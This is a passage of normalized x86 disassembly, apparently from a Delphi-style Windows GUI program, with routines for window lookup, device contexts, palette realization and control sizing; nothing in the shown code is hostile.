mov [ edx + 0x10 ] ecx
xor edx edx
mov [ ebp - 0xa ] edx
xor edx edx
mov [ ebp - 0x6 ] edx
xor edx edx
call sub_4634dc
sub_4472dd
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x0
retn
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_40341c
test al al
jne r-xdata
mov eax [ rw-data ]
call sub_403290
mov eax [ rw-data ]
mov edx [ rw-data ]
call sub_40341c
test al al
jne r-xdata
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
sub_44736c
push ebx
push esi
push [ eax + 0x4 ]
push [ eax ]
call WindowFromPoint
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax ebx
call sub_4459d4
mov esi eax
test esi esi
jne r-xdata
push ebx
call GetParent
mov ebx eax
test ebx ebx
jne r-xdata
sub_4473a0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov edi eax
xor esi esi
mov eax edi
call sub_44736c
mov ebp eax
test ebp ebp
je r-xdata
mov eax esi
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov esi ebp
push 0x0
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax ebp
call sub_448638
lea edx [ esp + 0x4 ]
mov ecx ebx
mov eax ebp
call sub_44cbc8
test eax eax
je r-xdata
mov esi eax
sub_4473e8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
mov edx esi
call sub_4181b4
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebx ] eax
sub_447410
push ebx
mov ebx eax
mov eax [ ebx ]
call sub_4184ac
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx ]
call sub_403290
xor eax eax
mov [ ebx ] eax
sub_447430
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
push esp
push ebx
call GetWindowOrgEx
push 0x0
mov eax [ esp + 0x8 ]
sub eax edi
push eax
mov eax [ esp + 0x8 ]
sub eax esi
push eax
push ebx
call SetWindowOrgEx
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_447460
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ rw-data ]
call sub_4186d4
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_447510
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_418738
retn
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0xc ]
jne r-xdata
xor eax eax
push ebp
push sub_4474e9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
call sub_44769c
call sub_403af0
call sub_403af0
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_418310
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
call sub_424750
test al al
je r-xdata
mov esp ebp
pop ebp
retn
sub_44751c
push ebp
mov ebp esp
add esp 0xfffffff4
mov eax [ rw-data ]
call sub_4186d4
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4475ba
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4475c1
mov eax [ rw-data ]
call sub_418738
retn
mov [ ebp - 0x4 ] eax
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
push ebp
push sub_447592
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_44769c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_4247ac
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_418310
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_424750
test al al
je r-xdata
sub_4475c8
push ebx
push esi
call sub_403644
mov ebx edx
mov esi eax
mov eax esi
call sub_44769c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4241c8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40362c
sub_4475f4
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_424930
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_424934
mov eax [ ebp - 0x4 ]
call sub_4476e8
mov eax [ rw-data ]
call sub_4186d4
mov ebx eax
xor eax eax
push ebp
push sub_447679
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x8 ] 0x4
jl r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x60 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5c ] eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4181b4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_418738
retn
call sub_447460
sub_44769c
push ebx
mov ebx eax
cmp [ ebx + 0x5c ] 0x0
je r-xdata
pop ebx
retn
xor edx edx
mov eax ebx
call sub_424934
mov edx ebx
mov eax [ rw-data ]
call sub_4186e8
mov eax [ ebx + 0x5c ]
push eax
mov eax [ ebx + 0x60 ]
push eax
call ReleaseDC
xor eax eax
mov [ ebx + 0x5c ] eax
sub_4476e8
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x58 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_449138
test al al
je r-xdata
and [ ebx + 0x54 ] 0xffffff7f
or [ ebx + 0x54 ] 0x80
jmp r-xdata
sub_447714
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403260
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035dc
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_447750
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_4189f0
pop esi
pop ebx
retn
mov eax ebx
mov edx [ esi + 0x10 ]
mov [ eax + 0x10 ] edx
mov edx [ esi + 0x8 ]
mov [ eax + 0x8 ] edx
mov edx [ esi + 0x14 ]
mov [ eax + 0x14 ] edx
mov edx [ esi + 0xc ]
mov [ eax + 0xc ] edx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_447798
push esi
mov esi eax
sub edx 0x1
jb r-xdata
cmp ecx [ esi + 0x8 ]
je r-xdata
je r-xdata
pop esi
retn
mov [ esi + 0x8 ] ecx
test ecx ecx
jbe r-xdata
cmp ecx [ esi + 0xc ]
je r-xdata
dec edx
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0x10 ]
jae r-xdata
mov [ esi + 0xc ] ecx
test ecx ecx
jbe r-xdata
cmp ecx [ esi + 0x10 ]
je r-xdata
dec edx
je r-xdata
mov [ esi + 0x10 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0x14 ]
jae r-xdata
mov [ esi + 0x10 ] ecx
mov eax [ esi + 0x8 ]
test eax eax
jbe r-xdata
cmp ecx [ esi + 0x14 ]
je r-xdata
jmp r-xdata
mov [ esi + 0x14 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp eax ecx
jae r-xdata
mov [ esi + 0x14 ] ecx
mov eax [ esi + 0xc ]
test eax eax
jbe r-xdata
mov [ esi + 0x8 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
cmp eax ecx
jae r-xdata
mov [ esi + 0xc ] ecx
sub_447854
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x1c ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_447921
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1 ] 0x1
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447928
lea eax [ ebp - 0x1c ]
call sub_404008
lea eax [ ebp - 0x8 ]
call sub_404008
retn
mov edx edi
mov eax [ ebx + 0x10 ]
mov si 0xffee
call sub_40348c
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x7c ] 0x0
je r-xdata
mov eax [ ebx + 0x10 ]
cmp [ eax + 0x84 ] 0x0
je r-xdata
cmp [ edi ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
mov eax [ edi ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
lea edx [ ebp - 0x1c ]
mov eax [ ebx + 0x10 ]
mov ax [ eax + 0x84 ]
call sub_457fe4
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
mov eax r-xdata
call sub_408d00
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_40405c
sub_447944
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_4479ab
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4550b0
test al al
je r-xdata
xor eax eax
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x18 ]
call sub_448af4
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403440
mov edx [ eax + 0x64 ]
pop eax
call sub_404414
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4479b2
lea eax [ ebp - 0x4 ]
call sub_404008
retn
mov al 0x1
sub_4479b8
push ebx
mov ebx eax
mov eax ebx
call sub_4550d8
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0x50 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403440
pop edx
cmp dl [ eax + 0x6a ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_4479ec
push ebx
mov ebx eax
mov eax ebx
call sub_455128
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403440
mov edx [ eax + 0x7c ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x80 ]
call sub_404414
je r-xdata
mov al 0x1
pop ebx
retn
sub_447a24
push ebx
mov ebx eax
mov eax ebx
call sub_455164
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403440
mov al [ eax + 0x86 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x57 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_447a58
push ebx
mov ebx eax
mov eax ebx
call sub_421004
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x120 ]
mov edx [ ebx + 0x10 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_447a80
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_448b24
sub_447aa0
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
mov ecx [ eax ]
call [ ecx + 0x64 ]
sub_447ac0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
add eax 0x80
mov edx esi
call sub_40405c
sub_447ae4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_448a14
sub_447b04
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x120 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x124 ] edx
sub_447b30
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403440
mov edi eax
mov eax [ edi + 0x74 ]
mov esi [ ebx + 0x18 ]
cmp eax [ esi + 0x158 ]
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403440
mov edx [ edi + 0x78 ]
mov eax [ esi + 0x154 ]
call sub_404414
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403440
mov al [ edi + 0x70 ]
cmp al [ esi + 0x150 ]
je r-xdata
mov al 0x1
sub_447b94
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_448470
sub_447bb4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_44845c
sub_447bd4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x18 ]
mov [ eax + 0x150 ] bl
sub_447bf4
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_420714
mov [ ebx + 0x3c ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x74 ]
mov [ ebx + 0x38 ] eax
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_423614
mov esi eax
mov [ ebx + 0x68 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_448ba4
mov al [ r-xdata ]
mov [ ebx + 0x61 ] al
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_447714
mov esi eax
mov [ ebx + 0x74 ] esi
mov [ esi + 0x1c ] ebx
mov [ esi + 0x18 ] sub_449a68
mov [ ebx + 0x70 ] 0xff000005
mov [ ebx + 0x57 ] 0x1
mov [ ebx + 0x58 ] 0x1
mov [ ebx + 0x59 ] 0x1
mov [ ebx + 0x5a ] 0x1
mov [ ebx + 0x9a ] 0x1
mov [ ebx + 0x60 ] 0x1
mov [ ebx + 0x5e ] 0x0
mov [ ebx + 0x7a ] 0xfff4
mov eax [ r-xdata ]
mov [ ebx + 0xb8 ] eax
mov [ ebx + 0x150 ] 0x1
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035dc
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_447ccc
push ebx
push esi
push edi
add esp 0xfffffff0
call sub_403644
mov ebx edx
mov edi eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx edi
call sub_4673f4
mov eax [ edi + 0xa0 ]
test eax eax
je r-xdata
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40362c
push edi
xor ecx ecx
mov edx 0xb039
call sub_449ca8
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov edx esp
mov eax edi
call sub_448494
mov ecx esp
or edx 0xffffffff
mov eax edi
mov si 0xffcc
call sub_40348c
xor eax eax
mov [ edi + 0xa0 ] eax
jmp r-xdata
mov eax [ edi + 0x6c ]
call sub_403290
xor eax eax
mov [ edi + 0x6c ] eax
mov eax [ edi + 0x74 ]
call sub_403290
mov eax [ edi + 0x68 ]
call sub_403290
mov eax [ edi + 0x64 ]
call sub_408870
mov edx ebx
and dl 0xfc
mov eax edi
call sub_420760
test bl bl
jle r-xdata
sub_447d98
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
sub_447dc0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] dl
mov ebp eax
xor ebx ebx
cmp [ ebp + 0x57 ] 0x0
je r-xdata
mov eax ebx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
mov si 0xffd7
call sub_40348c
mov edi eax
test edi edi
je r-xdata
lea edx [ esp + 0x4 ]
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov esi eax
mov al [ esp ]
xor al 0x1
neg al
sbb eax eax
push eax
push edi
push esi
call SelectPalette
mov edi eax
push esi
call RealizePalette
test eax eax
je r-xdata
push 0xffffffff
push edi
push esi
call SelectPalette
push esi
mov eax [ esp + 0x8 ]
push eax
call ReleaseDC
mov bl 0x1
mov eax ebp
mov edx [ eax ]
call [ edx + 0x7c ]
sub_447e48
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x61 ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x61 ] al
mov eax ebx
call sub_448148
sub_447e68
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
jne r-xdata
or [ ebx + 0x50 ] 0x8000
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
mov eax [ ebx + 0x6c ]
call sub_403290
xor eax eax
mov [ ebx + 0x6c ] eax
and [ ebx + 0x50 ] 0xffff7fff
jmp r-xdata
mov edx edi
mov eax [ ebx + 0x6c ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebx + 0x6c ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_44aac4
test [ edi + 0x1c ] 0x1
setne cl
mov edx edi
mov eax ebx
mov si 0xffef
call sub_40348c
mov edx ebx
mov eax edi
call sub_4207e4
mov eax ebx
mov si 0xffd9
call sub_40348c
mov ecx ebx
mov dl 0x1
call [ eax + 0x14 ]
mov [ ebx + 0x6c ] eax
pop edi
pop esi
pop ebx
retn
sub_447f30
push ebx
push esi
push edi
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x8
mov edi [ esi + 0x2c ]
mov eax edi
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_420b74
and [ ebx + 0x54 ] 0xfff7
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
pop edi
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax ebx
call sub_449ca8
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax ebx
call sub_449ca8
push 0x0
xor ecx ecx
mov edx 0xb023
mov eax ebx
call sub_449ca8
push 0x0
xor ecx ecx
mov edx 0xb035
mov eax ebx
call sub_449ca8
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_449ca8
sub_447fc4
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_420a30
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x7c ]
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
cmp edi eax
jne r-xdata
xor edx edx
mov eax esi
call sub_448aac
jmp r-xdata
xor edx edx
mov eax esi
call sub_447e68
sub_448008
push ebx
push esi
push edi
push ecx
mov ebx edx
mov edi eax
mov al [ edi + 0x5b ]
cmp bl al
je r-xdata
mov eax edi
mov si 0xffd0
call sub_40348c
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] al
mov [ edi + 0x5b ] bl
xor eax eax
mov al bl
mov dl [ eax + rw-data ]
mov eax edi
call sub_447e48
test [ edi + 0x1c ] 0x1
jne r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
cmp bl 0x6
je r-xdata
cmp [ edi + 0x30 ] 0x0
je r-xdata
cmp [ esp ] 0x6
je r-xdata
mov al [ esp ]
dec eax
sub al 0x2
setb al
mov edx ebx
add dl 0xfd
sub dl 0x2
setb dl
cmp al dl
jne r-xdata
mov eax edi
mov si 0xffee
call sub_40348c
mov al [ esp ]
test al al
je r-xdata
sub al 0x5
je r-xdata
test bl bl
je r-xdata
sub bl 0x5
je r-xdata
mov eax [ edi + 0x4c ]
push eax
mov eax [ edi + 0x48 ]
push eax
mov ecx [ edi + 0x44 ]
mov edx [ edi + 0x40 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
jmp r-xdata
sub_4480b0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea ecx [ ebp + 0x8 ]
lea edx [ ebp + 0xc ]
mov eax ebx
call sub_44a238
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
cmp esi [ ebx + 0x40 ]
jne r-xdata
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_448f3c
mov [ ebx + 0x40 ] esi
mov [ ebx + 0x44 ] edi
mov eax [ ebp + 0xc ]
mov [ ebx + 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_448148
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
push 0x0
xor ecx ecx
mov edx 0x47
mov eax ebx
call sub_449ca8
mov eax ebx
mov si 0xffd0
call sub_40348c
test [ ebx + 0x1c ] 0x1
jne r-xdata
cmp edi [ ebx + 0x44 ]
jne r-xdata
mov eax ebx
mov si 0xffcf
call sub_40348c
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x48 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x4c ]
je r-xdata
sub_448148
push ebx
push esi
add esp 0xfffffff0
mov esi eax
cmp [ esi + 0x62 ] 0x0
jne r-xdata
add esp 0x10
pop esi
pop ebx
retn
test [ esi + 0x1c ] 0x1
jne r-xdata
mov bl [ esi + 0x61 ]
mov al [ r-xdata ]
cmp al bl
jne r-xdata
test bl 0x4
je r-xdata
xor eax eax
mov [ esi + 0x90 ] eax
xor eax eax
mov [ esi + 0x94 ] eax
jmp r-xdata
mov eax [ esi + 0x48 ]
sar eax 0x1
jns r-xdata
test bl 0x1
je r-xdata
add eax [ esi + 0x40 ]
mov [ esi + 0x88 ] eax
adc eax 0x0
mov eax [ esi + 0x40 ]
mov [ esi + 0x88 ] eax
jmp r-xdata
mov eax [ esi + 0x48 ]
mov [ esi + 0x88 ] eax
jmp r-xdata
mov eax [ esi + 0x4c ]
sar eax 0x1
jns r-xdata
test bl 0x2
je r-xdata
test bl 0x8
je r-xdata
add eax [ esi + 0x44 ]
mov [ esi + 0x8c ] eax
adc eax 0x0
mov eax [ esi + 0x44 ]
mov [ esi + 0x8c ] eax
jmp r-xdata
mov eax [ esi + 0x4c ]
mov [ esi + 0x8c ] eax
jmp r-xdata
test [ ebx + 0x1c ] 0x2
je r-xdata
mov ebx [ esi + 0x30 ]
test ebx ebx
je r-xdata
mov eax ebx
call sub_44f5e0
test al al
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov eax [ esi + 0x30 ]
mov eax [ eax + 0x48 ]
mov [ esi + 0x90 ] eax
mov eax [ esi + 0x30 ]
mov eax [ eax + 0x4c ]
mov [ esi + 0x94 ] eax
mov edx esp
mov eax [ esi + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0x8 ]
mov [ esi + 0x90 ] eax
mov eax [ esp + 0xc ]
mov [ esi + 0x94 ] eax
jmp r-xdata
mov eax [ ebx + 0x1fa ]
mov [ esi + 0x90 ] eax
mov eax [ ebx + 0x1fe ]
mov [ esi + 0x94 ] eax
jmp r-xdata
sub_448264
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x4c ]
push eax
mov ecx [ esi + 0x44 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x1
pop esi
pop ebx
retn
sub_448288
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x4c ]
push eax
mov ecx edx
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x2
pop esi
pop ebx
retn
sub_4482b0
push ebx
push esi
mov esi eax
push edx
mov eax [ esi + 0x4c ]
push eax
mov ecx [ esi + 0x44 ]
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x4
pop esi
pop ebx
retn
sub_4482d4
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
push edx
mov ecx [ esi + 0x44 ]
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x8
pop esi
pop ebx
retn
sub_4482f8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp ebx [ eax + 0xa0 ]
je r-xdata
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x400
xor edx edx
push ebp
push sub_4483f3
push [ fs : edx ]
mov [ fs : edx ] esp
cmp ebx 0xffffffff
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
cmp ebx eax
je r-xdata
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov si 0xffe4
call sub_40348c
test ebx ebx
je r-xdata
cmp [ eax + 0x178 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4483fa
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xfbff
retn
mov edi eax
cmp ebx 0xffffffff
je r-xdata
cmp ebx 0xffffffff
je r-xdata
mov eax [ eax + 0x178 ]
mov edx [ ebp - 0x4 ]
call sub_4184ac
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xa0 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa0 ] ebx
test ebx ebx
je r-xdata
cmp [ ebx + 0x178 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffbf
call sub_40348c
test edi edi
je r-xdata
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov si 0xffc5
call sub_40348c
jmp r-xdata
mov eax [ ebx + 0x178 ]
mov edx [ ebp - 0x4 ]
call sub_4181b4
sub_448404
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_40341c
test al al
jne r-xdata
cmp esi [ ebx + 0x30 ]
je r-xdata
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_448f3c
mov edx edi
mov eax ebx
call sub_4484b4
mov edx edi
